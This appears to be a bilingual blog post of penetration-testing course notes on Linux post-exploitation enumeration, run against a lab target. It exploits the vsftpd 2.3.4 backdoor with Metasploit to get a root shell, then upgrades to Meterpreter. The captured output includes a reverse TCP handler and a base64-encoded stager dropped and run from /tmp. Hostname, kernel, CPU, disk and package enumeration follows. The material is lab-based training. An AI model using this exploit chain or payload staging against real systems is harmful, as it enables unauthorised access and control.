---
layout: post
title: "Enumerating System Information"
date: "2023-06-10"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Post-Exploitation
---

# Linux Local Enumeration
## Enumerating System Information
After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is very useful as it gives us an idea of what we can do and what type of exploits we can run.

What are we looking for?
* Hostname
* Distribution & distribution release version
* Kernel version & architecture
* CPU information
* Disk information & mounted drives
* Installed packages & software

## Demo: Enumerating System Information

# Linux 本地枚举
## 枚举系统信息
在获得对目标系统的初始访问权限后，了解有关系统的更多信息非常重要，例如正在运行的操作系统以及操作系统版本。此信息非常有用，因为它让我们了解我们可以做什么以及我们可以运行什么类型的漏洞利用。

我们在寻找什么？

* 主机名
* 分发版和分发版版本
* 内核版本和架构
* CPU 信息
* 磁盘信息和已挂载的驱动器
* 已安装的软件包和软件

## 演示：枚举系统信息
In the case of Linux, we also want to identify the distribution and the distribution release version. Why is this important? Let me give you a brief history as to what a Linux distribution is and how that will affect the post-exploitation phase of your penetration test when it comes down to Linux. Linux is an operating system kernel, and a Linux distribution is the pairing of software and utilities with the Linux kernel. An example of a Linux distribution is Ubuntu, Debian, Arch Linux, Manjaro, so on and so forth. The key thing to note here is that distributions are designed differently and utilize different utilities. For example, for package management. If I exploit a Debian-based distribution like Ubuntu, the default package manager that's used on Debian-based distributions is the aptitude package manager, which is abbreviated to `apt`. If you've ever typed in `sudo apt-get install`, that is the aptitude package manager. If I exploit a Linux target running an Arch Linux-based distribution, the default package manager is the Pacman package manager. And this information is very important, not just in the context of package managers, but these distributions are designed and developed, and the different utilities they utilize. Getting an idea of what exact distribution is running on the Linux target system is very important, as well as the distribution release version. Let me just use another example. If I exploit a Linux target running Ubuntu, I also want to identify what specific version of Ubuntu is running on the target, because Ubuntu has multiple release versions. And all of this information is pertinent to privilege escalation. If I exploit in a Linux target running Ubuntu, I also need to identify the specific version of Ubuntu running, so that I can identify privilege escalation exploits that are specific to that specific version of Ubuntu that is installed on the target system.

In addition to the distribution and distribution release version information, we also need to identify the kernel version and architecture. Remember a Linux distribution is the pairing of the Linux kernel and additional utilities that make up an operating system as a whole. The Linux kernel has a different versioning system that is not tied to a specific distribution. You have the ability to install other Linux kernels, or modified Linux kernels on your Linux distribution. You need to identify the specific kernel version and the architecture. And the reason this information is important is if you are trying to perform privilege escalation via kernel exploit, you need the specific kernel version that's running on the target to locate kernel exploits for that specific kernel that is installed on the target system. We also want to identify the architecture of the kernel. This will give us an idea of what type of binaris we can execute on the target system. Is the kernel a 32-bit kernel? Is it a 64-bit kernel, etc?  

We can also enumerate the CPU information, so we can get an idea of what CPU is installed on the target system or what is running, how many cores it has. And this will give us an idea of the resource allocation of the target system.

We can also identify or enumerate disk information and mounted drives, so we can get an idea of the current drives connected to the Linux target system of compromise. How much our storage has been consumed? How much is left? Are there any other drives that are connected to the Linux target system, etc?

And finally we can also enumerate the installed packages and software. This will give us an idea of what packages are installed on the Linux system. And this is also pertinent to privilege escalation whereby we are going to be utilizing this information to identify specific packages that might be vulnerable to a privilege escalation vulnerability.

Kali Linux : 192.178.80.2

Target IP Address : 192.178.80.3

The next step would be to identify the vulnerable service that's running on the target system that we can exploit to gain access.

We are going to perform a simple Nmap service version detection scan on the target IP.

```
nmap -sV 192.178.80.3
```

```
searchsploit vsftpd
```

```
msfconsole -q
search vsftpd
```

We can set the RHOSTS global variable. It will set th RHOSTS value globally for all modules that you use. 

```
setg RHOSTS 192.178.80.3
use exploit/unix/ftp/vsftpd_234_backdoor
show options
exploit
```

This should provide us with a command shell session, that we can then upgrade to a Meterpreter session. We will gain access to the target system. It looks like we've gained access to the target system as the root user. The root user on Linux is the user account with the highest privileges available. It is the equivalent of the administrator account on Windows.

```
whoami
```

Whenever we're working on a Linux system, we want to obtain a somewhat interactive session. We can spawn a bash session.

```
/bin/bash -i
```

This will provide us with a proper bash terminal on the target system. One of the greate features of bash is that it'll show you your current user `@` the hostname of the system. In this case, we have access to the target system. The target system is called victim-1, and we currently have access to the target system as the root user which means we do not need to perform any privilege escalation.

We can also upgrade this to an Meterpreter session.

Put this in the background.

```
sessions
```

We have our command shell session here.

```
sessions -u 1
sessions
```

We have indeed obtained a Meterpreter session.

```
sessions 2
```

And we can now get started with the process of performing system information enumeration.

```
meterpreter > sysinfo
```

We can also explore how to perform system information enumeration manually, through the use of a standard bash session on the Linux target.

```
meterpreter > shell
```

To obtain a bash session.

```
/bin/bash -i
```

We can navigate to the home directory of the root user.

```
cd /root
```

Print out our working directory.

```
pwd
```

Let's start off firstly by identifying the hostname.

```
hostname
```

If we want to check and see what distribution is running.

```
cat /etc/issue
```

If we want to identify more information regarding the specific version of Debian that's running. 

```
cat /etc/*release
```

We can also enumerate the kernel version that's running.

```
uname -a
```

If you want to clean up this output, to limit it to the kernel version.

```
uname -r
```

That is how to enumerate the distribution release version, as well as the kernel version.

You can also enumerate the environment variables for a specific user.

```
env
```

That'll display the environment variables for the root user. This will provide you with the environment variables for the root user, specifically. It'll provide you with the PATH information. The PATH environment variable specifies the directory that is used by default whenever you type in a command, or rather for binaries. Whenever you type in a command like `cat`, it'll check the `/usr/local/sbin` directory, and see whether the `cat` binary is in there. If it is in there, it'll execute it. The working directory of the root user is under `/root`.

We know just additional information regarding this user accounts' environment variables.

Let's talk a little bit about hardware resources, or rather resource consumption.

We can display the CPU information.

```
lscpu
```

We can also get an idea of how much RAM is being consumed.

```
free -h
```

Display how much RAM is being consumed.

If I wanted to display a list of drives or disks connected to the system, I can utilize the `df` utility.

`-h`: I can specify the output to be human readable.

```
df -h
```

`/dev/sda` that's storage device A. That is where this Linux system has been installed. And it is mounted on `/etc/hosts`. This might not be the same for all the Linux systems that you will work on. But this is a special case, because this is running in a data center. 

You can also limit this to specific file extensions. So if I was only interested in the `ext4` file extension, which is the default file format for the Linux operating system, that will display `/dev/sda`, which is storage device A. This is the equivalent of the C drive for Linux.

```
df -ht ext4
```

You can also display disk information. And then grepping the output only display devices with the storage device annotation.

```
lsblk | grep sd 
```

Storage device B is a swap partition. That is used for swap memory. This will give you an idea of what configuration and partitions that are configured on the Linux target system.

The final piece of information that we can enumerate is the installed packages, or the installed software.

`-l` to list the installed packages on this system. It'll display all the installed packages.

```
dpkg -l
```

On Linux, they're going to be quite a lot, because every tool or utility or command is considered a package.

Specific versions of bash have been known to suffer from privilege escalation vulnerabilities. So all of this information is extremely important and will be exploring how this information can be contextualized in the case of identifying vulnerabilities that affect the specific version of a particular utility that is installed on a target system.

# Enumerating System Information
## Overview
Goal

This lab covers the process enumerating local system information from a target system running Linux.

# 枚举系统信息
## 概述
目标

本实验涵盖从运行 Linux 的目标系统枚举本地系统信息的过程。

## 复现视频内容
Kali Linux : 192.234.154.2

Target IP Address : 192.234.154.3

```
root@attackdefense:~# nmap -sV 192.234.154.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-06-10 02:44 UTC
Nmap scan report for target-1 (192.234.154.3)
Host is up (0.000010s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:C0:EA:9A:03 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

```
root@attackdefense:~# searchsploit vsftpd 2.3.4
------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                     |  Path
                                                                                                                   | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                             | exploits/unix/remote/17491.rb
------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

```
root@attackdefense:~# service postgresql start && msfconsole -q
[ ok ] Starting PostgreSQL 11 database server: main.
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf5 > setg RHOSTS 192.234.154.3
RHOSTS => 192.234.154.3
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.234.154.3    yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.234.154.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.234.154.3:21 - USER: 331 Please specify the password.
[+] 192.234.154.3:21 - Backdoor service has been spawned, handling...
[+] 192.234.154.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.234.154.2:46163 -> 192.234.154.3:6200) at 2023-06-10 02:48:14 +0000

whoami
root
/bin/bash -i
bash: cannot set terminal process group (10): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~/vsftpd-2.3.4# 
```

```
root@victim-1:~/vsftpd-2.3.4# ^Z
Background session 1? [y/N]  y
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.234.154.2:46163 -> 192.234.154.3:6200 (192.234.154.3)

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.234.154.2:4433 
[*] Sending stage (985320 bytes) to 192.234.154.3
[*] Meterpreter session 2 opened (192.234.154.2:4433 -> 192.234.154.3:36736) at 2023-06-10 02:53:00 +0000
[-] Error: Unable to execute the following command: "echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towOqaAmgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZtgywA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/lFAzq.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/bSwwZ' < '/tmp/lFAzq.b64' ; chmod +x '/tmp/bSwwZ' ; '/tmp/bSwwZ' & sleep 2 ; rm -f '/tmp/bSwwZ' ; rm -f '/tmp/lFAzq.b64'"
[-] Output: "[1] 22"
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                   Connection
  --  ----  ----                   -----------                                   ----------
  1         shell cmd/unix                                                       192.234.154.2:46163 -> 192.234.154.3:6200 (192.234.154.3)
  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 192.234.154.3  192.234.154.2:4433 -> 192.234.154.3:36736 (192.234.154.3)

msf5 exploit(unix/ftp/vsftpd_234_backdoor) > sessions 2
[*] Starting interaction with 2...

meterpreter > 
```

```
meterpreter > sysinfo
Computer     : 192.234.154.3
OS           : Debian 9.5 (Linux 5.4.0-125-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=0
meterpreter > shell
Process 26 created.
Channel 1 created.
/bin/bash -i
bash: cannot set terminal process group (10): Inappropriate ioctl for device
bash: no job control in this shell
root@victim-1:~/vsftpd-2.3.4# 
```

```
root@victim-1:~/vsftpd-2.3.4# pwd
/root/vsftpd-2.3.4
pwd
root@victim-1:~/vsftpd-2.3.4# cd /root
cd /root
root@victim-1:~# pwd
/root
pwd
```

```
root@victim-1:~# hostname
hostname
victim-1
```

```
root@victim-1:~# cat /etc/issue
cat /etc/issue
Debian GNU/Linux 9 \n \l
```

```
root@victim-1:~# cat /etc/*release
cat /etc/*release
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

```
root@victim-1:~# uname -a
uname -a
Linux victim-1 5.4.0-125-generic #141-Ubuntu SMP Wed Aug 10 13:42:03 UTC 2022 x86_64 GNU/Linux
```

```
root@victim-1:~# uname -r
uname -r
5.4.0-125-generic
```

```
root@victim-1:~# env
env
LANG=C
USER=root
PWD=/root
HOME=/root
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
OLDPWD=/root/vsftpd-2.3.4
_=/usr/bin/env
```

```
root@victim-1:~# lscpu
lscpu
Architecture:          x86_64
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                48
On-line CPU(s) list:   0-47
Thread(s) per core:    1
Core(s) per socket:    48
Socket(s):             1
NUMA node(s):          1
Vendor ID:             AuthenticAMD
CPU family:            23
Model:                 49
Model name:            AMD EPYC 7642 48-Core Processor
Stepping:              0
CPU MHz:               2299.984
BogoMIPS:              4599.96
Hypervisor vendor:     KVM
Virtualization type:   full
L1d cache:             64K
L1i cache:             64K
L2 cache:              512K
L3 cache:              16384K
NUMA node0 CPU(s):     0-47
Flags:                 fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm rep_good nopl cpuid extd_apicid tsc_known_freq pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm cmp_legacy cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw perfctr_core ssbd ibrs ibpb stibp vmmcall fsgsbase tsc_adjust bmi1 avx2 smep bmi2 rdseed adx smap clflushopt clwb sha_ni xsaveopt xsavec xgetbv1 xsaves clzero xsaveerptr wbnoinvd arat umip rdpid arch_capabilities
```

```
root@victim-1:~# free -h
free -h
bash: free: command not found
```

```
root@victim-1:~# df -h
df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         1.9T  1.6T  206G  89% /
tmpfs            64M     0   64M   0% /dev
tmpfs            48G     0   48G   0% /sys/fs/cgroup
shm              64M     0   64M   0% /dev/shm
/dev/sda        1.9T  1.6T  206G  89% /etc/hosts
udev             48G     0   48G   0% /dev/tty
tmpfs            48G     0   48G   0% /proc/acpi
tmpfs            48G     0   48G   0% /proc/scsi
tmpfs            48G     0   48G   0% /sys/firmware
```

```
root@victim-1:~# df -ht ext4
df -ht ext4
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda        1.9T  1.6T  206G  89% /etc/hosts
```

```
root@victim-1:~# lsblk | grep sd
lsblk | grep sd
sda    8:0    0  1.9T  0 disk /etc/hosts
sdb    8:16   0  512M  0 disk [SWAP]
```

```
root@victim-1:~# dpkg -l
dpkg -l
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                      Version                    Architecture Description
+++-=========================-==========================-============-===============================================================================
ii  adduser                   3.115                      all          add and remove users and groups
ii  apt                       1.4.8                      i386         commandline package manager
ii  base-files                9.9+deb9u5                 i386         Debian base system miscellaneous files
ii  base-passwd               3.5.43                     i386         Debian base system master password and group files
ii  bash                      4.4-5                      i386         GNU Bourne Again SHell
ii  binutils                  2.28-5                     i386         GNU assembler, linker and binary utilities
ii  bsdutils                  1:2.29.2-1+deb9u1          i386         basic utilities from 4.4BSD-Lite
ii  build-essential           12.3                       i386         Informational list of build-essential packages
ii  bzip2                     1.0.6-8.1                  i386         high-quality block-sorting file compressor - utilities
ii  coreutils                 8.26-3                     i386         GNU core utilities
ii  cpp                       4:6.3.0-4                  i386         GNU C preprocessor (cpp)
ii  cpp-6                     6.3.0-18+deb9u1            i386         GNU C preprocessor
ii  dash                      0.5.8-2.4                  i386         POSIX-compliant shell
ii  debconf                   1.5.61                     all          Debian configuration management system
ii  debian-archive-keyring    2017.5                     all          GnuPG archive keys of the Debian archive
ii  debianutils               4.8.1.1                    i386         Miscellaneous utilities specific to Debian
ii  diffutils                 1:3.5-3                    i386         File comparison utilities
ii  dirmngr                   2.1.18-8~deb9u2            i386         GNU privacy guard - network certificate management service
ii  dpkg                      1.18.25                    i386         Debian package management system
ii  dpkg-dev                  1.18.25                    all          Debian package development tools
ii  e2fslibs:i386             1.43.4-2                   i386         ext2/ext3/ext4 file system libraries
ii  e2fsprogs                 1.43.4-2                   i386         ext2/ext3/ext4 file system utilities
ii  fakeroot                  1.21-3.1                   i386         tool for simulating superuser privileges
ii  findutils                 4.6.0+git+20161106-2       i386         utilities for finding files--find, xargs
ii  g++                       4:6.3.0-4                  i386         GNU C++ compiler
ii  g++-6                     6.3.0-18+deb9u1            i386         GNU C++ compiler
ii  gcc                       4:6.3.0-4                  i386         GNU C compiler
ii  gcc-6                     6.3.0-18+deb9u1            i386         GNU C compiler
ii  gcc-6-base:i386           6.3.0-18+deb9u1            i386         GCC, the GNU Compiler Collection (base package)
ii  gnupg                     2.1.18-8~deb9u2            i386         GNU privacy guard - a free PGP replacement
ii  gnupg-agent               2.1.18-8~deb9u2            i386         GNU privacy guard - cryptographic agent
ii  gnupg-l10n                2.1.18-8~deb9u2            all          GNU privacy guard - localization files
ii  gpgv                      2.1.18-8~deb9u2            i386         GNU privacy guard - signature verification tool
ii  grep                      2.27-2                     i386         GNU grep, egrep and fgrep
ii  gzip                      1.6-5+b1                   i386         GNU compression utilities
ii  hostname                  3.18+b1                    i386         utility to set/show the host name or domain name
ii  init-system-helpers       1.48                       all          helper tools for all init systems
ii  iproute2                  4.9.0-1+deb9u1             i386         networking and traffic control tools
ii  iputils-ping              3:20161105-1               i386         Tools to test the reachability of network hosts
ii  libacl1:i386              2.2.52-3+b1                i386         Access control list shared library
ii  libalgorithm-diff-perl    1.19.03-1                  all          module to find differences between files
ii  libalgorithm-diff-xs-perl 0.04-4+b2                  i386         module to find differences between files (XS accelerated)
ii  libalgorithm-merge-perl   0.08-3                     all          Perl module for three-way merge of textual data
ii  libapt-pkg5.0:i386        1.4.8                      i386         package management runtime library
ii  libasan3:i386             6.3.0-18+deb9u1            i386         AddressSanitizer -- a fast memory error detector
ii  libassuan0:i386           2.4.3-2                    i386         IPC library for the GnuPG components
ii  libatomic1:i386           6.3.0-18+deb9u1            i386         support library providing __atomic built-in functions
ii  libattr1:i386             1:2.4.47-2+b2              i386         Extended attribute shared library
ii  libaudit-common           1:2.6.7-2                  all          Dynamic library for security auditing - common files
ii  libaudit1:i386            1:2.6.7-2                  i386         Dynamic library for security auditing
ii  libblkid1:i386            2.29.2-1+deb9u1            i386         block device ID library
ii  libbz2-1.0:i386           1.0.6-8.1                  i386         high-quality block-sorting file compressor library - runtime
ii  libc-bin                  2.24-11+deb9u3             i386         GNU C Library: Binaries
ii  libc-dev-bin              2.24-11+deb9u3             i386         GNU C Library: Development binaries
ii  libc6:i386                2.24-11+deb9u3             i386         GNU C Library: Shared libraries
ii  libc6-dev:i386            2.24-11+deb9u3             i386         GNU C Library: Development Libraries and Header Files
ii  libcap-ng0:i386           0.7.7-3+b1                 i386         An alternate POSIX capabilities library
ii  libcap2:i386              1:2.25-1                   i386         POSIX 1003.1e capabilities (library)
ii  libcc1-0:i386             6.3.0-18+deb9u1            i386         GCC cc1 plugin for GDB
ii  libcilkrts5:i386          6.3.0-18+deb9u1            i386         Intel Cilk Plus language extensions (runtime)
ii  libcomerr2:i386           1.43.4-2                   i386         common error description library
ii  libdb5.3:i386             5.3.28-12+deb9u1           i386         Berkeley v5.3 Database Libraries [runtime]
ii  libdebconfclient0:i386    0.227                      i386         Debian Configuration Management System (C-implementation library)
ii  libdpkg-perl              1.18.25                    all          Dpkg perl modules
ii  libelf1:i386              0.168-1                    i386         library to read and write ELF files
ii  libfakeroot:i386          1.21-3.1                   i386         tool for simulating superuser privileges - shared libraries
ii  libfdisk1:i386            2.29.2-1+deb9u1            i386         fdisk partitioning library
ii  libffi6:i386              3.2.1-6                    i386         Foreign Function Interface library runtime
ii  libfile-fcntllock-perl    0.22-3+b2                  i386         Perl module for file locking with fcntl(2)
ii  libgcc-6-dev:i386         6.3.0-18+deb9u1            i386         GCC support library (development files)
ii  libgcc1:i386              1:6.3.0-18+deb9u1          i386         GCC support library
ii  libgcrypt20:i386          1.7.6-2+deb9u3             i386         LGPL Crypto library - runtime library
ii  libgdbm3:i386             1.8.3-14                   i386         GNU dbm database routines (runtime version)
ii  libgmp10:i386             2:6.1.2+dfsg-1             i386         Multiprecision arithmetic library
ii  libgnutls30:i386          3.5.8-5+deb9u3             i386         GNU TLS library - main runtime library
ii  libgomp1:i386             6.3.0-18+deb9u1            i386         GCC OpenMP (GOMP) support library
ii  libgpg-error0:i386        1.26-2                     i386         library for common error values and messages in GnuPG components
ii  libhogweed4:i386          3.3-1+b2                   i386         low level cryptographic library (public-key cryptos)
ii  libidn11:i386             1.33-1                     i386         GNU Libidn library, implementation of IETF IDN specifications
ii  libisl15:i386             0.18-1                     i386         manipulating sets and relations of integer points bounded by linear constraints
ii  libitm1:i386              6.3.0-18+deb9u1            i386         GNU Transactional Memory Library
ii  libksba8:i386             1.3.5-2                    i386         X.509 and CMS support library
ii  libldap-2.4-2:i386        2.4.44+dfsg-5+deb9u2       i386         OpenLDAP libraries
ii  libldap-common            2.4.44+dfsg-5+deb9u2       all          OpenLDAP common files for libraries
ii  liblocale-gettext-perl    1.07-3+b1                  i386         module using libc functions for internationalization in Perl
ii  liblz4-1:i386             0.0~r131-2+b1              i386         Fast LZ compression algorithm library - runtime
ii  liblzma5:i386             5.2.2-1.2+b1               i386         XZ-format compression library
ii  libmnl0:i386              1.0.4-2                    i386         minimalistic Netlink communication library
ii  libmount1:i386            2.29.2-1+deb9u1            i386         device mounting library
ii  libmpc3:i386              1.0.3-1+b2                 i386         multiple precision complex floating-point library
ii  libmpfr4:i386             3.1.5-1                    i386         multiple precision floating-point computation
ii  libmpx2:i386              6.3.0-18+deb9u1            i386         Intel memory protection extensions (runtime)
ii  libncursesw5:i386         6.0+20161126-1+deb9u2      i386         shared libraries for terminal handling (wide character support)
ii  libnettle6:i386           3.3-1+b2                   i386         low level cryptographic library (symmetric and one-way cryptos)
ii  libnpth0:i386             1.3-1                      i386         replacement for GNU Pth using system threads
ii  libp11-kit0:i386          0.23.3-2                   i386         library for loading and coordinating access to PKCS#11 modules - runtime
ii  libpam-modules:i386       1.1.8-3.6                  i386         Pluggable Authentication Modules for PAM
ii  libpam-modules-bin        1.1.8-3.6                  i386         Pluggable Authentication Modules for PAM - helper binaries
ii  libpam-runtime            1.1.8-3.6                  all          Runtime support for the PAM library
ii  libpam0g:i386             1.1.8-3.6                  i386         Pluggable Authentication Modules library
ii  libpcre3:i386             2:8.39-3                   i386         Old Perl 5 Compatible Regular Expression Library - runtime files
ii  libperl5.24:i386          5.24.1-3+deb9u4            i386         shared Perl library
ii  libquadmath0:i386         6.3.0-18+deb9u1            i386         GCC Quad-Precision Math Library
ii  libreadline7:i386         7.0-3                      i386         GNU readline and history libraries, run-time libraries
ii  libsasl2-2:i386           2.1.27~101-g0780600+dfsg-3 i386         Cyrus SASL - authentication abstraction library
ii  libsasl2-modules:i386     2.1.27~101-g0780600+dfsg-3 i386         Cyrus SASL - pluggable authentication modules
ii  libsasl2-modules-db:i386  2.1.27~101-g0780600+dfsg-3 i386         Cyrus SASL - pluggable authentication modules (DB)
ii  libselinux1:i386          2.6-3+b3                   i386         SELinux runtime shared libraries
ii  libsemanage-common        2.6-2                      all          Common files for SELinux policy management libraries
ii  libsemanage1:i386         2.6-2                      i386         SELinux policy management library
ii  libsepol1:i386            2.6-2                      i386         SELinux library for manipulating binary security policies
ii  libsmartcols1:i386        2.29.2-1+deb9u1            i386         smart column output alignment library
ii  libsqlite3-0:i386         3.16.2-5+deb9u1            i386         SQLite 3 shared library
ii  libss2:i386               1.43.4-2                   i386         command-line interface parsing library
ii  libssl1.1:i386            1.1.0f-3+deb9u2            i386         Secure Sockets Layer toolkit - shared libraries
ii  libstdc++-6-dev:i386      6.3.0-18+deb9u1            i386         GNU Standard C++ Library v3 (development files)
ii  libstdc++6:i386           6.3.0-18+deb9u1            i386         GNU Standard C++ Library v3
ii  libsystemd0:i386          232-25+deb9u4              i386         systemd utility library
ii  libtasn1-6:i386           4.10-1.1+deb9u1            i386         Manage ASN.1 structures (runtime)
ii  libtinfo5:i386            6.0+20161126-1+deb9u2      i386         shared low-level terminfo library for terminal handling
ii  libubsan0:i386            6.3.0-18+deb9u1            i386         UBSan -- undefined behaviour sanitizer (runtime)
ii  libudev1:i386             232-25+deb9u4              i386         libudev shared library
ii  libustr-1.0-1:i386        1.0.4-6                    i386         Micro string library: shared library
ii  libuuid1:i386             2.29.2-1+deb9u1            i386         Universally Unique ID library
ii  linux-libc-dev:i386       4.9.110-3+deb9u6           i386         Linux support headers for userspace development
ii  login                     1:4.4-4.1                  i386         system login tools
ii  lsb-base                  9.20161125                 all          Linux Standard Base init script functionality
ii  make                      4.1-9.1                    i386         utility for directing compilation
ii  manpages                  4.10-2                     all          Manual pages about using a GNU/Linux system
ii  manpages-dev              4.10-2                     all          Manual pages about using GNU/Linux for development
ii  mawk                      1.3.3-17+b3                i386         a pattern scanning and text processing language
ii  mount                     2.29.2-1+deb9u1            i386         tools for mounting and manipulating filesystems
ii  multiarch-support         2.24-11+deb9u3             i386         Transitional package to ensure multiarch compatibility
ii  ncurses-base              6.0+20161126-1+deb9u2      all          basic terminal type definitions
ii  ncurses-bin               6.0+20161126-1+deb9u2      i386         terminal-related programs and man pages
ii  netbase                   5.4                        all          Basic TCP/IP networking system
ii  passwd                    1:4.4-4.1                  i386         change and administer password and group data
ii  patch                     2.7.5-1+deb9u1             i386         Apply a diff file to an original
ii  perl                      5.24.1-3+deb9u4            i386         Larry Wall's Practical Extraction and Report Language
ii  perl-base                 5.24.1-3+deb9u4            i386         minimal Perl system
ii  perl-modules-5.24         5.24.1-3+deb9u4            all          Core Perl modules
ii  pinentry-curses           1.0.0-2                    i386         curses-based PIN or pass-phrase entry dialog for GnuPG
ii  readline-common           7.0-3                      all          GNU readline and history libraries, common files
ii  rename                    0.20-4                     all          Perl extension for renaming multiple files
ii  sed                       4.4-1                      i386         GNU stream editor for filtering/transforming text
ii  sensible-utils            0.0.9+deb9u1               all          Utilities for sensible alternative selection
ii  sysvinit-utils            2.88dsf-59.9               i386         System-V-like utilities
ii  tar                       1.29b-1.1                  i386         GNU version of the tar archiving utility
ii  tzdata                    2018e-0+deb9u1             all          time zone and daylight-saving time data
ii  util-linux                2.29.2-1+deb9u1            i386         miscellaneous system utilities
ii  xz-utils                  5.2.2-1.2+b1               i386         XZ-format compression utilities
ii  zlib1g:i386               1:1.2.8.dfsg-5             i386         compression library - runtime
```